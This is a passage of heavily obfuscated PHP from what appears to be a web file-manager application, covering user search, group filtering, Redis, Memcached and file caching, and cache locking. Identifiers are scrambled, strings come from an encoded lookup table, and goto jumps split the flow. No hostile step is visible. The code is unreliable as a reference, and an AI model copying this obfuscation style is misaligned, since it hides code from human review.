$this->_makeOrder()->where($î•‰İñ)->selectPage(20); if (!$Î†ş¡ñ§ || count($Î†ş¡ñ§[$ä¡€å¡İ[456]]) < 5 && Input::check($ñêıÒš², $ä¡€å¡İ[404])) { $àº“¸š¼ = $this->_searchFromMeta($ä¡€å¡İ[548], $ñêıÒš², 10); $°¾œª´ = $this->_searchFromMeta($ä¡€å¡İ[549], $ñêıÒš², 10); $º‘‹í´– = array_merge($àº“¸š¼, $°¾œª´, $Î†ş¡ñ§[$ä¡€å¡İ[456]]); $Î†ş¡ñ§[$ä¡€å¡İ[456]] = array_unique_by_key($º‘‹í´–, $ä¡€å¡İ[1775]); $Î†ş¡ñ§[$ä¡€å¡İ[453]][$ä¡€å¡İ[454]] = count($Î†ş¡ñ§[$ä¡€å¡İ[456]]); $Î†ş¡ñ§[$ä¡€å¡İ[453]][$ä¡€å¡İ[455]] = ceil($Î†ş¡ñ§[$ä¡€å¡İ[453]][$ä¡€å¡İ[454]] / $Î†ş¡ñ§[$ä¡€å¡İ[453]][$ä¡€å¡İ[450]]); } $this->_listDataApply($Î†ş¡ñ§[$ä¡€å¡İ[456]]); $this->_filterByGroup($Î†ş¡ñ§, $¬ó‚‡íÄ); return $Î†ş¡ñ§; } private function _filterByGroup(&$¥Ñ°Ÿ”ª, $İ¹ûŸ—Å) { $ØùæàÃ” =& $_SERVER[±³—úê]; if (!$İ¹ûŸ—Å) { return $¥Ñ°Ÿ”ª; } foreach ($¥Ñ°Ÿ”ª[$ØùæàÃ”[456]] as $şã´Á«¡ => &$³ƒı‹ò·) { $“Ğ×ü™Ñ = array_to_keyvalue($³ƒı‹ò·[$ØùæàÃ”[2167]], $ØùæàÃ”[12], $ØùæàÃ”[1975]); if (!in_array($İ¹ûŸ—Å, $“Ğ×ü™Ñ)) { unset($¥Ñ°Ÿ”ª[$ØùæàÃ”[456]][$şã´Á«¡]); } } unset($³ƒı‹ò·); $¥Ñ°Ÿ”ª[$ØùæàÃ”[456]] = array_values($¥Ñ°Ÿ”ª[$ØùæàÃ”[456]]); $¥Ñ°Ÿ”ª[$ØùæàÃ”[453]] = array($ØùæàÃ”[2235] => count($¥Ñ°Ÿ”ª[$ØùæàÃ”[456]]), $ØùæàÃ”[2233] => $¥Ñ°Ÿ”ª[$ØùæàÃ”[453]][$ØùæàÃ”[450]], $ØùæàÃ”[2232] => 1, $ØùæàÃ”[2234] => 1); } private function _searchFromMeta($Óî…ËÎı, $òÛµúûš, $¼­Àˆ¤—) { $ÏÜêÉ† =& $_SERVER[±³—úê]; $òÛµúûš = strtolower($òÛµúûš); $å‚§ö¿— = array($ÏÜêÉ†[97] => $Óî…ËÎı, $ÏÜêÉ†[461] => array($ÏÜêÉ†[470], "\x25{$òÛµúûš}\x25")); $å‚§ö¿— = $this->parseWhereLike($å‚§ö¿—); $Ïù±×¡µ = Model($ÏÜêÉ†[2505])->where($å‚§ö¿—)->limit($¼­Àˆ¤—)->select(); if (!$Ïù±×¡µ) { return array(); } $Ïù±×¡µ = array_to_keyvalue($Ïù±×¡µ, $ÏÜêÉ†[12], $ÏÜêÉ†[1775]); $Ù·Ñ—§ = $this->where(array($ÏÜêÉ†[1766] => array($ÏÜêÉ†[7], $Ïù±×¡µ)))->select(); if (!$Ù·Ñ—§) { return array(); } return $Ù·Ñ—§; } private function _listDataApplyItem($Æ¦È†Şµ) { $ ¾‡âÛ = array($Æ¦È†Şµ); $this->_listDataApply($ ¾‡âÛ); return $ ¾‡âÛ[0]; } private function _listDataApply(&$øØ§œª¶) { $ìÅûÛ¡Ê =& $_SERVER[±³—úê]; if (!$øØ§œª¶) { return; } array_remove_key($øØ§œª¶, $ìÅûÛ¡Ê[968]); $á»œí¾¹ = array_to_keyvalue($øØ§œª¶, $ìÅûÛ¡Ê[12], $ìÅûÛ¡Ê[1775]); $this->_listAppendGroup($øØ§œª¶, $á»œí¾¹); $this->_listAppendMeta($øØ§œª¶, $á»œí¾¹); $this->_listAppendSourceRoot($øØ§œª¶, $á»œí¾¹); } private function _listAppendSourceRoot(&$ïå±«˜, $·¾ø‚Ôú) { $„€“ëÔ× =& $_SERVER[±³—úê]; $ØÜ¨Àæå = Model($„€“ëÔ×[905])->listSourceRoot(SourceModel::TYPE_USER, $·¾ø‚Ôú); $ØÜ¨Àæå = array_to_keyvalue($ØÜ¨Àæå, $„€“ëÔ×[580]); $ØÜ¨Àæå = array_remove_key($ØÜ¨Àæå, $„€“ëÔ×[580]); foreach ($ïå±«˜ as &$ÓÒ£¬’ç) { $ÓÒ£¬’ç[$„€“ëÔ×[90]] = $ØÜ¨Àæå[$ÓÒ£¬’ç[$„€“ëÔ×[1775]]] ? $ØÜ¨Àæå[$ÓÒ£¬’ç[$„€“ëÔ×[1775]]] : array(); } unset($ÓÒ£¬’ç); } private function _listAppendGroup(&$ç¶ŠÍª§, $Ÿ™¶ºûÑ) { $‘¬ üÉ‹ =& $_SERVER[±³—úê]; $ÂÑÔ¢º = array($‘¬ üÉ‹[1775] => array($‘¬ üÉ‹[7], $Ÿ™¶ºûÑ)); $áæÏŠŒ = Model($‘¬ üÉ‹[2069])->where($ÂÑÔ¢º)->select(); $­¨‡Şù› = array_to_keyvalue($áæÏŠŒ, $‘¬ üÉ‹[12], $‘¬ üÉ‹[1975]); $­¨‡Şù› = array_remove_value(array_unique($­¨‡Şù›), $‘¬ üÉ‹[240]); if (!$­¨‡Şù› || !$áæÏŠŒ) { return; } $ÂÑÔ¢º = array($‘¬ üÉ‹[1975] => array($‘¬ üÉ‹[7], $­¨‡Şù›)); $ş©€úõ§ = Model($‘¬ üÉ‹[2165])->field($‘¬ üÉ‹[2506])->where($ÂÑÔ¢º)->select(); $ş©€úõ§ = array_to_keyvalue($ş©€úõ§, $‘¬ üÉ‹[1975]); $áæÏŠŒ = array_to_keyvalue_group($áæÏŠŒ, $‘¬ üÉ‹[1775]); foreach ($áæÏŠŒ as &$”ØÇ×è›) { $¤ç‘òª• = array(); foreach ($”ØÇ×è› as $‰•íõåï) { if (!$‰•íõåï[$‘¬ üÉ‹[2083]]) { continue; } $í×¶»İÈ = Model($‘¬ üÉ‹[582])->listData($‰•íõåï[$‘¬ üÉ‹[2083]]); $¤ç‘òª•[] = array($‘¬ üÉ‹[1975] => $‰•íõåï[$‘¬ üÉ‹[1975]], $‘¬ üÉ‹[2507] => $ş©€úõ§[$‰•íõåï[$‘¬ üÉ‹[1975]]][$‘¬ üÉ‹[32]], $‘¬ üÉ‹[595] => $ş©€úõ§[$‰•íõåï[$‘¬ üÉ‹[1975]]][$‘¬ üÉ‹[595]], $‘¬ üÉ‹[498] => $í×¶»İÈ); } $”ØÇ×è› = $¤ç‘òª•; } unset($”ØÇ×è›); foreach ($ç¶ŠÍª§ as &$›Ä–÷ú€) { $›Ä–÷ú€[$‘¬ üÉ‹[2167]] = array(); if (isset($áæÏŠŒ[$›Ä–÷ú€[$‘¬ üÉ‹[1775]]])) { $›Ä–÷ú€[$‘¬ üÉ‹[2167]] = $áæÏŠŒ[$›Ä–÷ú€[$‘¬ üÉ‹[1775]]]; } } unset($›Ä–÷ú€); } public function userAppendGroup($©Ëº¦‚Ğ) { $†æË¸¿  =& $_SERVER[±³—úê]; if (!$©Ëº¦‚Ğ) { return array(); } $this->_listAppendGroup($©Ëº¦‚Ğ, array_to_keyvalue($©Ëº¦‚Ğ, $†æË¸¿ [12], $†æË¸¿ [1775])); return $©Ëº¦‚Ğ; } private function _listAppendMeta(&$Ç´™Öûï, $°ËÇğ) { $¼Ñ•Œº =& $_SERVER[±³—úê]; $èÖ”Öşí = UserJobModel::JOB_KEY; $¶’„É· = array($¼Ñ•Œº[2487]); $€†ëİûı = array($¼Ñ•Œº[1775] => array($¼Ñ•Œº[7], $°ËÇğ)); $ë¿îè­„ = Model($¼Ñ•Œº[2485])->where($€†ëİûı)->select(); $ë¿îè­„ = array_to_keyvalue_group($ë¿îè­„, $¼Ñ•Œº[1775]); foreach ($ë¿îè­„ as &$ÉÕÚíÒş) { $ç¾Å±˜ = array(); foreach ($ÉÕÚíÒş as $ÎÇÆ¥ó£) { if (!in_array($ÎÇÆ¥ó£[$¼Ñ•Œº[97]], $¶’„É·)) { $ç¾Å±˜[$ÎÇÆ¥ó£[$¼Ñ•Œº[97]]] = $ÎÇÆ¥ó£[$¼Ñ•Œº[461]]; } } $ÉÕÚíÒş = $ç¾Å±˜; } unset($ÉÕÚíÒş); $ÉËìßÄÉ = Model($¼Ñ•Œº[2508]); foreach ($Ç´™Öûï as &$ûåùÊ®å) { $©ûè»Î² = array(); if (isset($ë¿îè­„[$ûåùÊ®å[$¼Ñ•Œº[1775]]])) { $©ûè»Î² = $ë¿îè­„[$ûåùÊ®å[$¼Ñ•Œº[1775]]]; } $ûåùÊ®å[$¼Ñ•Œº[2509]] = array(); if (isset($©ûè»Î²[$èÖ”Öşí])) { $ûåùÊ®å[$¼Ñ•Œº[2509]] = $ÉËìßÄÉ->getUserJobInfo($©ûè»Î²[$èÖ”Öşí]); } } unset($ûåùÊ®å); } protected function groupUserAll($Ä¦òÑØ) { $”°Å¿šÏ =& $_SERVER[±³—úê]; if (!$Ä¦òÑØ) { return !1; } $‹Õ…Œ½Æ = Model($”°Å¿šÏ[2069])->field($”°Å¿šÏ[1775])->where(array($”°Å¿šÏ[1975] => array($”°Å¿šÏ[7], $Ä¦òÑØ)))->select(); $‹Õ…Œ½Æ = array_to_keyvalue($‹Õ…Œ½Æ, $”°Å¿šÏ[12], $”°Å¿šÏ[1775]); return array_unique($‹Õ…Œ½Æ); } public function userSearch($£Š¸äû , $œúè¥óé = "\x2a") { return Model($_SERVER[±³—úê][608])->where($£Š¸äû )->field($œúè¥óé)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ØŞ°¦Ì) { $Ğ‚£§ô¾ =& $_SERVER[±³—úê]; $Ø³µì†‹ = defined($Ğ‚£§ô¾[2202]) && USER_ID ? USER_ID : $Ğ‚£§ô¾[12]; return "\125\x73\145\162\117\x70\x74\151\157\156\x5f{$ØŞ°¦Ì}\137" . $Ø³µì†‹; } protected function filterWhere($±¾–ù©Û) { $çÒ€”çà =& $_SERVER[±³—úê]; $±¾–ù©Û[$çÒ€”çà[1775]] = defined($çÒ€”çà[2202]) && USER_ID ? USER_ID : $çÒ€”çà[12]; return $±¾–ù©Û; } public function cacheRemoveUser($•Ğç–Í, $ØûÙÃ‹‰) { return Cache::remove("\125\163\145\x72\117\x70\x74\x69\157\x6e\137{$•Ğç–Í}\x5f" . $ØûÙÃ‹‰); } protected function optionDefault($íõ©»ğç = '') { $ŸíşÚê =& $_SERVER[±³—úê]; if ($íõ©»ğç == $ŸíşÚê[12]) { return $GLOBALS[$ŸíşÚê[6]][$ŸíşÚê[2510]]; } if ($íõ©»ğç == $ŸíşÚê[2511]) { return $GLOBALS[$ŸíşÚê[6]][$ŸíşÚê[2512]]; } } } goto Dˆå¼ğ·§; F®×İÜ”Ï: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $«§ŸÇğé =& $_SERVER[±³—úê]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÅâŸ¦¿û = $GLOBALS[$«§ŸÇğé[6]][$«§ŸÇğé[435]]; $æ¸Ø±Î = $ÅâŸ¦¿û[$ÅâŸ¦¿û[$«§ŸÇğé[907]]]; $±ÎüÔŸ = $ÅâŸ¦¿û[$«§ŸÇğé[908]]; switch ($ÅâŸ¦¿û[$«§ŸÇğé[907]]) { case $«§ŸÇğé[21]: self::$handle = Model($«§ŸÇğé[909]); break; case $«§ŸÇğé[910]: self::$handle = new CacheRedis($æ¸Ø±Î, $±ÎüÔŸ); break; case $«§ŸÇğé[911]: self::$handle = new CacheMemcached($æ¸Ø±Î, $±ÎüÔŸ); break; case $«§ŸÇğé[242]: self::$handle = new CacheFile($æ¸Ø±Î, $±ÎüÔŸ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¦Ãş®‡ü) { if (is_array($¦Ãş®‡ü) || is_object($¦Ãş®‡ü)) { $¦Ãş®‡ü = json_encode($¦Ãş®‡ü); } $¦Ãş®‡ü = rawurlencode($¦Ãş®‡ü); return md5(KOD_SITE_ID . $_SERVER[±³—úê][11] . $¦Ãş®‡ü); } public static function get($Ú¦Ã››£, $¡˜Ù‚Ò = false) { $®½İ÷‡™ = self::key($Ú¦Ã››£); $‹¸€¢æ„ = self::init(); if ($¡˜Ù‚Ò) { return unserialize($‹¸€¢æ„->get($®½İ÷‡™)); } if (!isset(self::$memoryCache[$®½İ÷‡™])) { $“Ÿ¸ôÅë = $‹¸€¢æ„->get($®½İ÷‡™); self::$memoryCache[$®½İ÷‡™] = unserialize($“Ÿ¸ôÅë); } return self::$memoryCache[$®½İ÷‡™]; } public static function set($Ğ’£×ÄÓ, $İÕ¥»©×, $²Ö ”î¹ = false) { $¯œ«É¿Ö =& $_SERVER[±³—úê]; $”ñ«²€³ = self::key($Ğ’£×ÄÓ); if (isset(self::$memoryCache[$”ñ«²€³]) && self::$memoryCache[$”ñ«²€³] === $İÕ¥»©×) { return !0; } if ($²Ö ”î¹ === 0) { self::$memoryCache[$”ñ«²€³] = $İÕ¥»©×; return !0; } $†æˆê¤ = self::init(); $ĞŸî°ü³ = serialize($İÕ¥»©×); CacheLock::lock($Ğ’£×ÄÓ . $¯œ«É¿Ö[912]); $·’®Šâº = $†æˆê¤->set($”ñ«²€³, $ĞŸî°ü³, $²Ö ”î¹); self::$memoryCache[$”ñ«²€³] = $İÕ¥»©×; CacheLock::unlock($Ğ’£×ÄÓ . $¯œ«É¿Ö[912]); return $·’®Šâº; } public static function getCall($°ãôúøÈ, $ş¥ë‡, $ŠåØòÅÛ, $€éô£µ = array()) { $ô‘Ş…€ =& $_SERVER[±³—úê]; $å¤Â¥ä› = self::get($°ãôúøÈ); if ($å¤Â¥ä› || $å¤Â¥ä› === $ô‘Ş…€[12]) { return $å¤Â¥ä›; } $å¤Â¥ä› = call_user_func_array($ŠåØòÅÛ, $€éô£µ); $å¤Â¥ä› = $å¤Â¥ä› ? $å¤Â¥ä› : $ô‘Ş…€[12]; self::set($°ãôúøÈ, $å¤Â¥ä›, $ş¥ë‡); return $å¤Â¥ä›; } public static function remove($åö‹µ) { $¯û£¹ùÒ = self::key($åö‹µ); unset(self::$memoryCache[$¯û£¹ùÒ]); self::clearTimeout(); CacheLock::lock($åö‹µ); $èóÕæ¥ = self::init()->remove($¯û£¹ùÒ); CacheLock::unlock($åö‹µ); return $èóÕæ¥; } public static function removeMemory($õ£Ù…—) { $ÌÅ·Ãû = self::key($õ£Ù…—); unset(self::$memoryCache[$ÌÅ·Ãû]); } public static function clearMemory($…ÌÊ¶¤ê = false) { if ($…ÌÊ¶¤ê) { $…ÌÊ¶¤ê = self::key($…ÌÊ¶¤ê); unset(self::$memoryCache[$…ÌÊ¶¤ê]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[±³—úê][913])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[±³—úê][914])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($±ÍÚÚœ, $ô¹·ù) { $æã»ÙËÔ =& $_SERVER[±³—úê]; $this->cachePath = $±ÍÚÚœ[$æã»ÙËÔ[87]]; $this->prefix = $æã»ÙËÔ[915]; $this->cacheTime = $ô¹·ù; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Æ›²öÓ) { $ŸñÛ®ç =& $_SERVER[±³—úê]; $Æ›²öÓ = str_replace(array($ŸñÛ®ç[916], $ŸñÛ®ç[100], $ŸñÛ®ç[76]), $ŸñÛ®ç[917], $Æ›²öÓ); return $this->cachePath . $ŸñÛ®ç[918] . $Æ›²öÓ . $ŸñÛ®ç[919]; } public function set($ÏÓ™šÆÎ, $É¨Ò±øÙ, $³„éËñö = false) { $³„éËñö = $³„éËñö ? $³„éËñö : $this->cacheTime; $ñÖ…´²¨ = $this->getFile($ÏÓ™šÆÎ); if (file_put_contents($ñÖ…´²¨, $this->prefix . $É¨Ò±øÙ, LOCK_EX)) { @touch($ñÖ…´²¨, intval(time() + $³„éËñö)); clearstatcache(); return !0; } @unlink($ñÖ…´²¨); return !1; } public function get($ÉÎ¿ áº) { $…‚æ¢Æë = $this->getFile($ÉÎ¿ áº); if (file_exists($…‚æ¢Æë) && filemtime($…‚æ¢Æë) < time()) { @unlink($…‚æ¢Æë); return !1; } $ßàÓ™ÇÇ = @file_get_contents($…‚æ¢Æë); return substr($ßàÓ™ÇÇ, strlen($this->prefix)); } public function remove($İ×°©…Ş) { $¶İ©¨õ = $this->getFile($İ×°©…Ş); return @unlink($¶İ©¨õ); } public function deleteAll() { $¬ûŠâÉä =& $_SERVER[±³—úê]; $î¼˜ƒ…© = scandir($this->cachePath); foreach ($î¼˜ƒ…© as $ÕŞÓÅñ†) { $É“¿¸ÀÂ = $this->cachePath . $ÕŞÓÅñ†; if (strpos($É“¿¸ÀÂ, $¬ûŠâÉä[919]) && strpos($É“¿¸ÀÂ, $¬ûŠâÉä[920])) { @unlink($É“¿¸ÀÂ); } } } public function clearTimeout() { $âà‚¿Í¨ =& $_SERVER[±³—úê]; $Û¢à©Ç = scandir($this->cachePath); foreach ($Û¢à©Ç as $®²‡³®ª) { $‡õ¤Õ¸† = $this->cachePath . $®²‡³®ª; if (strpos($‡õ¤Õ¸†, $âà‚¿Í¨[919]) && strpos($‡õ¤Õ¸†, $âà‚¿Í¨[920]) && filemtime($‡õ¤Õ¸†) < time()) { @unlink($‡õ¤Õ¸†); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $æÒêÀŠš =& $_SERVER[±³—úê]; if (self::$handle) { return self::$handle; } $Ä„ûĞæ = $GLOBALS[$æÒêÀŠš[6]][$æÒêÀŠš[435]]; self::$timeout = $Ä„ûĞæ[$æÒêÀŠš[921]] ? $Ä„ûĞæ[$æÒêÀŠš[921]] : 10; $øõŠ»Á = _get($GLOBALS[$æÒêÀŠš[6]], $æÒêÀŠš[922]); $ÌÀó÷Ë = $Ä„ûĞæ[$æÒêÀŠš[907]] ? $Ä„ûĞæ[$æÒêÀŠš[907]] : $æÒêÀŠš[242]; if ($ÌÀó÷Ë == $æÒêÀŠš[21] && $øõŠ»Á == $æÒêÀŠš[13]) { $ÌÀó÷Ë = $æÒêÀŠš[242]; } switch ($ÌÀó÷Ë) { case $æÒêÀŠš[910]: self::$handle = new CacheLockRedis(); break; case $æÒêÀŠš[911]: self::$handle = new CacheLockMemcached(); break; case $æÒêÀŠš[21]: self::$handle = new CacheLockDatabase(); break; case $æÒêÀŠš[242]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($æÒêÀŠš[923], $æÒêÀŠš[924]); } return self::$handle; } private static function key($™å›Âİˆ) { return $_SERVER[±³—úê][925] . Cache::key($™å›Âİˆ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ØòÀåà– = '') { self::$errorMsg = $ØòÀåà–; } public static function lockGlobal($¾êÕí», $Ü˜³«³ˆ) { return self::lock($¾êÕí», $Ü˜³«³ˆ, !0); } public static function lock($¤Ş ßÙ†, $¹Ö†ÀÀÁ = false, $í¬Ğš‚ô = false) { $¢¿õøì« =& $_SERVER[±³—úê]; $ËÁ°¢Ç– = self::init(); $Âëœş§ = self::key($¤Ş ßÙ†); $¹Ö†ÀÀÁ = $¹Ö†ÀÀÁ ? $¹Ö†ÀÀÁ : self::$timeout; $øäè˜° = timeFloat(); if ($GLOBALS[$¢¿õøì«[926]]) { if (!$ËÁ°¢Ç–->lock($Âëœş§, 0.2)) { die; } return !0; } $èİ¶Æ = $ËÁ°¢Ç–->lock($Âëœş§, $¹Ö†ÀÀÁ); $ÊËÊ–Ú¸ = timeFloat(); if (!$èİ¶Æ) { $ŞØ” —İ = "\154\x6f\x63\153\x20\145\x72\x72\157\162\x3b\153\145\171\x3d{$¤Ş ßÙ†}\x3b\164\151\155\145\x3d{$¹Ö†ÀÀÁ}\73" . self::$errorMsg . $¢¿õøì«[74] . get_caller_msg(); $á“öæ¥‰ = LNG($¢¿õøì«[927]) . "\x28{$¹Ö†ÀÀÁ}\x73\x29\x2e" . LNG($¢¿õøì«[928]); $á“öæ¥‰ .= $¢¿õøì«[929]; if (is_string(self::$errorMsg) && self::$errorMsg) { $á“öæ¥‰ = $á“öæ¥‰ . $¢¿õøì«[930] . self::$errorMsg; } write_log($¢¿õøì«[931] . sprintf($¢¿õøì«[932], timeFloat() - $øäè˜°) . $¢¿õøì«[933] . $ŞØ” —İ . $¢¿õøì«[934] . json_encode(error_get_last()), $¢¿õøì«[924]); show_json($á“öæ¥‰, !1); } if (!$í¬Ğš‚ô) { self::$lockItem[$Âëœş§] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ùÏºú˜å = number_format(timeFloat() - $ÊËÊ–Ú¸, 3); write_log($¢¿õøì«[935] . $¤Ş ßÙ† . $¢¿õøì«[936] . $ùÏºú˜å, $¢¿õøì«[924]); } return $èİ¶Æ; } public static function lockGet($§û‹æ¢è) { $²ö‹Ì¾¼ = self::key($§û‹æ¢è); if (self::$lockItem[$²ö‹Ì¾¼]) { return self::$lockItem[$²ö‹Ì¾¼]; } return self::init()->lockGet($²ö‹Ì¾¼); } public static function unlock($ü…‹—…—) { $€´ŠÄÃé =& $_SERVER[±³—úê]; $¼•…šŠ = self::key($ü…‹—…—); self::$lockItem[$¼•…šŠ] = null; self::init()->unlock($¼•…šŠ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($€´ŠÄÃé[937] . $ü…‹—…—, $€´ŠÄÃé[924]); } return; } public static function unlockRuntime() { $ş¶ˆôŒ“ =& $_SERVER[±³—úê]; $°õ²ëÁ€ = self::init(); $°Ã‡¾¬¼ = !1; foreach (self::$lockItem as $ßşú¬ì => $«Êî¼í) { if (!$«Êî¼í) { continue; } $°õ²ëÁ€->unlock($ßşú¬ì); if (!$°Ã‡¾¬¼) { $°Ã‡¾¬¼ = !0; write_log($ş¶ˆôŒ“[938] . $ßşú¬ì . $ş¶ˆôŒ“[74] . get_caller_msg(), $ş¶ˆôŒ“[924]); continue; } write_log($ş¶ˆôŒ“[938] . $ßşú¬ì, $ş¶ˆôŒ“[924]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¶€ûÎª´ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ş¶ˆôŒ“[939] . $¶€ûÎª´ . $ş¶ˆôŒ“[940] . ACTION, $ş¶ˆôŒ“[924]); } } public static function fileLock($öú’ÇÁ±) { $›ÒëÆ…Á =& $_SERVER[±³—úê]; if (!$GLOBALS[$›ÒëÆ…Á[941]]) { $GLOBALS[$›ÒëÆ…Á[941]] = array(); } $GLOBALS[$›ÒëÆ…Á[941]][$öú’ÇÁ±] = !1; $È¨üôÄ’ = fopen(DATA_PATH . $öú’ÇÁ± . $›ÒëÆ…Á[942], $›ÒëÆ…Á[943]); if (!$È¨üôÄ’) { return !1; } $GLOBALS[$›ÒëÆ…Á[941]][$öú’ÇÁ±] = $È¨üôÄ’; if (flock($È¨üôÄ’, LOCK_EX)) { return !0; } self::unlock($öú’ÇÁ±); show_json($›ÒëÆ…Á[944], !1); return !1; } public static function fileUnlock($³ÔñÓ´ù) { $ÔòÚ¨Ô =& $_SERVER[±³—úê]; $ÑºêûšØ = $GLOBALS[$ÔòÚ¨Ô[941]][$³ÔñÓ´ù]; if (!$ÑºêûšØ) { return; } $GLOBALS[$ÔòÚ¨Ô[941]][$³ÔñÓ´ù] = !1; flock($ÑºêûšØ, LOCK_UN); fclose($ÑºêûšØ); } public static function fileUnlockAll() { $ÇÊ†Ûœ =& $_SERVER[±³—úê]; if (!isset($GLOBALS[$ÇÊ†Ûœ[941]]) || !$GLOBALS[$ÇÊ†Ûœ[941]]) { return; } foreach ($GLOBALS[$ÇÊ†Ûœ[941]] as $…Š²“Õ => $‘Äœúä) { if (!$‘Äœúä) { continue; } $GLOBALS[$ÇÊ†Ûœ[941]][$…Š²“Õ] = !1; flock($‘Äœúä, LOCK_UN); fclose($‘Äœúä); } $GLOBALS[$ÇÊ†Ûœ[941]] = array(); } } goto CÑ¼ŠÀ˜Å¥; C‰Ü‰’À: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\x65" => "\147\162\157\165\x70\137\x6d\x65\x74\x61", "\x6d\x65\164\x61\106\x69\x65\x6c\x64" => "\147\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($ì†øƒ†¼) { $–ğ˜óàÍ =& $_SERVER[±³—úê]; return array($–ğ˜óàÍ[2057] => array($ì†øƒ†¼[0], $–ğ˜óàÍ[2058]), $–ğ˜óàÍ[2059] => array($ì†øƒ†¼[0], $–ğ˜óàÍ[2060])); } protected function getInfo($ÁâÆ¾½ö, $¯¸å©¹Ç = false) { $¼É‚”Ó† = $this->getInfoSimple($ÁâÆ¾½ö); if (!$¼É‚”Ó†) { return !1; } if ($¯¸å©¹Ç) { return $this->_listDataApplyItem($¼É‚”Ó†); } return $this->cacheFunctionGet($_SERVER[±³—úê][2061], $ÁâÆ¾½ö); } protected function getInfoSimple($Ô‘Óç, $„¦Æ Î¿ = false) { $†Ê——”Ç =& $_SERVER[±³—úê]; if ($„¦Æ Î¿) { $ß»¬Ğƒ“ = array($†Ê——”Ç[1975] => intval($Ô‘Óç)); $‚âÙ…  = $this->where($ß»¬Ğƒ“)->find(); return is_array($‚âÙ… ) ? $‚âÙ…  : array(); } return $this->cacheFunctionGet($†Ê——”Ç[2062], $Ô‘Óç); } protected function groupAdd($´‰¿ÅÖ‡) { $³öîÜÔ„ =& $_SERVER[±³—úê]; if (!$´‰¿ÅÖ‡[$³öîÜÔ„[192]] && isset($´‰¿ÅÖ‡[$³öîÜÔ„[1975]]) && $´‰¿ÅÖ‡[$³öîÜÔ„[1975]] == 1) { if ($ÀÄÍÛæ¢ = $this->getInfoSimple($´‰¿ÅÖ‡[$³öîÜÔ„[1975]], !0)) { return $´‰¿ÅÖ‡[$³öîÜÔ„[1975]]; } } else { $ÀÄÍÛæ¢ = $this->getInfoSimple($´‰¿ÅÖ‡[$³öîÜÔ„[192]]); if (!$ÀÄÍÛæ¢) { return !1; } } $éµŞÁ£å = $³öîÜÔ„[604]; if ($ÀÄÍÛæ¢[$³öîÜÔ„[595]]) { $éµŞÁ£å = $ÀÄÍÛæ¢[$³öîÜÔ„[595]] . $ÀÄÍÛæ¢[$³öîÜÔ„[1975]] . $³öîÜÔ„[50]; } $ï’Ê‰¥… = array($³öîÜÔ„[505] => $this->groupNameAuto($´‰¿ÅÖ‡[$³öîÜÔ„[192]], $´‰¿ÅÖ‡[$³öîÜÔ„[32]]), $³öîÜÔ„[488] => $´‰¿ÅÖ‡[$³öîÜÔ„[192]], $³öîÜÔ„[666] => $éµŞÁ£å, $³öîÜÔ„[2063] => $´‰¿ÅÖ‡[$³öîÜÔ„[1961]], $³öîÜÔ„[2064] => 0, $³öîÜÔ„[1979] => 0); if (isset($´‰¿ÅÖ‡[$³öîÜÔ„[1999]])) { $ï’Ê‰¥…[$³öîÜÔ„[1999]] = $´‰¿ÅÖ‡[$³öîÜÔ„[1999]]; } else { $Î…‹Û‹° = $this->max($³öîÜÔ„[1999]); if (!$Î…‹Û‹°) { $Î…‹Û‹° = 0; } $ï’Ê‰¥…[$³öîÜÔ„[1999]] = $Î…‹Û‹° + 1; } if (!empty($´‰¿ÅÖ‡[$³öîÜÔ„[1975]])) { $ï’Ê‰¥…[$³öîÜÔ„[1975]] = $´‰¿ÅÖ‡[$³öîÜÔ„[1975]]; } $·ı°şÛİ = $this->add($ï’Ê‰¥…); $this->setNamePinyin($·ı°şÛİ, $ï’Ê‰¥…[$³öîÜÔ„[32]]); if (isset($´‰¿ÅÖ‡[$³öîÜÔ„[2065]])) { $this->metaSet($·ı°şÛİ, array($³öîÜÔ„[2065] => $´‰¿ÅÖ‡[$³öîÜÔ„[2065]], $³öîÜÔ„[2066] => $´‰¿ÅÖ‡[$³öîÜÔ„[2066]])); unset($´‰¿ÅÖ‡[$³öîÜÔ„[2065]]); unset($´‰¿ÅÖ‡[$³öîÜÔ„[2066]]); } Model($³öîÜÔ„[1423])->groupRootAdd($·ı°şÛİ); $this->_clearCache($´‰¿ÅÖ‡[$³öîÜÔ„[192]]); return $·ı°şÛİ; } protected function groupEdit($¬×çò–ù, $¿ÂüÇ‘‚) { $¸İ¬˜Ãò =& $_SERVER[±³—úê]; $Â÷š¨² = $this->getInfoSimple($¬×çò–ù); if (!$Â÷š¨²) { return !1; } if (!empty($¿ÂüÇ‘‚[$¸İ¬˜Ãò[192]])) { $Äñ…ÑÚÛ = $this->getInfoSimple($¿ÂüÇ‘‚[$¸İ¬˜Ãò[192]]); if (!$Äñ…ÑÚÛ) { return !1; } if ($Â÷š¨²[$¸İ¬˜Ãò[1975]] == $Äñ…ÑÚÛ[$¸İ¬˜Ãò[1975]]) { return !1; } if ($¿ÂüÇ‘‚[$¸İ¬˜Ãò[192]] != $Â÷š¨²[$¸İ¬˜Ãò[192]]) { if ($Äñ…ÑÚÛ[$¸İ¬˜Ãò[595]] !== $Â÷š¨²[$¸İ¬˜Ãò[595]] && 